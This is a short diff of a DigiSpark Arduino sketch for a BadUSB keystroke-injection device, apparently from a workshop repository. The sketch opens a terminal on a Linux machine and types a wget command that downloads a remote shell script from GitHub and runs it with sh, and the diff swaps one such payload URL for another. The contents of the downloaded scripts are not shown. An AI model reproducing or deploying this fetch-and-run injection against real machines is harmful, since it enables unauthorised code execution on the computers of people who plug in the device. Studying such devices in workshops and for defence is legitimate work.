@@ -14,7 +14,7 @@ void loop() {
     DigiKeyboard.print(F("gnome-terminal"));
     DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
     DigiKeyboard.delay(300);
-    DigiKeyboard.print(F("wget https://gist.githubusercontent.com/whoismath/1e45a552b3975640bf2fe3e952772ee4/raw/66cc8f16376d06fc4cbb9cab96cfaa801674bedf/change.sh && sh change.sh"));
+    DigiKeyboard.print(F("wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-linux.sh && sh payload-linux.sh"));
     DigiKeyboard.delay(100);
     DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
   }
